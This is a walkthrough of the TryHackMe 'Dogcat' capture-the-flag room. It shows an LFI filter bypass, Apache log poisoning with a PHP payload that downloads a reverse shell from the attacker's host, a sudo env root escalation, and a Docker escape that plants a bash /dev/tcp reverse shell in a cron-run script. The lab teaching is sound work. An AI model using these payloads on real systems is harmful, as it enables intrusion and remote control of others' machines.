---
title: "TryHackMe - Dogcat"
author: Nasrallah
description: ""
date: 2022-07-07 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, medium, lfi, logpoisoning, burpsuite, docker, sudo]
img_path : /assets/img/tryhackme/dogcat/
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Dogcat](https://tryhackme.com/room/dogcat) from [TryHackMe](https://tryhackme.com). The target is running a Apache web server which has a page vulnerable to an lfi. We use that and do a log poisoning to get a reverse shell. After that we use our ability to run a binary as root and escalate our privileges. We find that we are on a docker container and modify a script that runs regularly to sends us a reverse shell and escape the container.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.149.64 (10.10.149.64)
Host is up (0.068s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two open ports, port 22 running ssh and port 80 running Apache web server.

### Web

Let's navigate to the web page.

![](1.png)

The page is a gallery of dogs and cats pictures, if you choose one of the two option, we get a picture.

![](2.png)

There is an interesting things we see in the url.

![](3.png)

We have the `view` parameter loading `cat/dog`, this might be vulnerable to LFI (**L**ocal **F**ile **I**nclusion).

Let's try a simple file inclusion like `../../../../etc/passwd`.

![](4.png)

Got the message that only dogs or cats are allowed. But if we add the word `cat` or `dog` at our payload we get a warning, which is a good sign. `cat/../../../etc/passwd` 

![](5.png)

The value of the `view` parameter get passed to the `include()` function, and the page append a `.php` extension at the end as we can see in the image above.

Let's see if the base64 filter works and get the source code of cat.php. `php://filter/convert.base64-encode/resource=cat`

![](6.png)

Great! The filter is working on this query.

Now let's bypass the word check with directory traversal and get the code of index.php. `php://filter/convert.base64-encode/resource=cat/../index`

![](7.png)

When we decode that we get the following.

```php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>

```

The site checks if the `ext` parameter is set, and if not it adds `.php` to the filename.

Now we can easily read the `etc/passwd` file by adding `&ext` at the end of our query.`cat../../../../../etc/passwd&ext`

![](8.png)

## Foothold

### Log Poisoning

We will use a technique called [log poisoning](https://owasp.org/www-community/attacks/Log_Injection) to get a reverse shell. Since the server is Apache, the log file is located at `/var/log/apache2/access.log`, we can see it with the following query`cat/../../../../var/log/apache2/access.log&ext`

![](9.png)

Let's fire up `Burp Suite` and intercept a request to the website and send it to repeater.

![](10.png)

What we are going to do is put a php code in the useragent parameter that would upload a php reverse shell to the target machine.

We can use [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)'s reverse shell, download it and set the ip address variable to your tun0 ip. After that, run a http server using python: `python3 -m http.server 80`.

The php code we're going to put at the useragent parameter is the following:

```php
<?php file_put_contents('shell.php',file_get_contents('http://10.11.10.10/shell.php'))?>
```

>Don't forget to change the file name 'shell.php` to the name of your php code, and change the ip address.

![](11.png)

Now send the request, and go to the browser and request the access.log file as we did before using the view parameter. You should see the reverse shell file gets downloaded.

![](12.png)

Now set up a netcat listener with `nc -lvnp 1234` and go to request the reverse shell file: http://10.10.10.10/shell.php

![](13.png)

Great! We got a reverse shell.

## Privilege Escalation

### Escalate to root

Let's check our current privileges with `sudo -l`.

![](14.png)

We can run `/usr/bin/env` as root and without a password, let's go to [GTFOBins](https://gtfobins.github.io/gtfobins/env/#sudo) to see if we can get root with that.

![](15.png)

Indeed we can, let's run that command : `sudo /usr/bin/env /bin/bash`.

![](16.png)

Great! We got root, but we are not done yet. If we list all the content of the root directory of the file system we find that we are in a docker container.

![](17.png)

### Docker escape

If we go to /opt directory, we find some interesting file.

![](18.png)

The backup.tar file has been modified very recently, and the backup.sh file is the one responsible for that, so there must be a cronjob running.

Let's modify the content of the backup.sh file by adding a script that would send us a reverse shell. `/bin/bash -i >& /dev/tcp/10.10.10.10/9001 0>&1`

![](19.png)

Now set up another netcat listener and wait for that shell.

![](20.png)

Great! We escaped the docker container and we are root on that system.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

## References

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

https://www.youtube.com/watch?v=zGDbi15Jkqw